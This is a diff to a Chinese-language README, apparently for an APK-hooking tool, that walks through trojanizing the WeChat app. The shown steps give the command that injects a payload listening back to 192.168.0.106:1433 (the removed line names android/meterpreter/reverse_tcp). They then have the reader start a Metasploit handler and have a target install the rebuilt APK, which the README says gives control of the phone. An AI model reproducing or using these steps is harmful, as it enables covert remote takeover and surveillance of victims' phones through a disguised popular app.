@@ -46,11 +46,11 @@
 ```sh
 
 ╭─ ~/520apkhook                                                                                    х INT Py py3 16:36:11
-╰─❯ python main.py --lhost 192.168.0.106 --lport 1433 -p android/meterpreter/reverse_tcp -n 微信_7.0.22.apk
+╰─❯ python main.py --lhost 192.168.0.106 --lport 1433  -n ../微信_7.0.22.apk
 
 ```
 
-![注入App](./images/520ApkHook.svg)
+[![asciicast](https://asciinema.org/a/449061.svg)](https://asciinema.org/a/449061)
 
 3. 使用msfconsole加载handler.rc进行服务端监听
 
@@ -61,7 +61,7 @@
 
 ```
 
-![注入App](./images/StartMsf.svg)
+[![asciicast](https://asciinema.org/a/449064.svg)](https://asciinema.org/a/449064)
 
 4. 将生成的apk文件在安卓手机进行安装, 即可完成对目标的控制
 
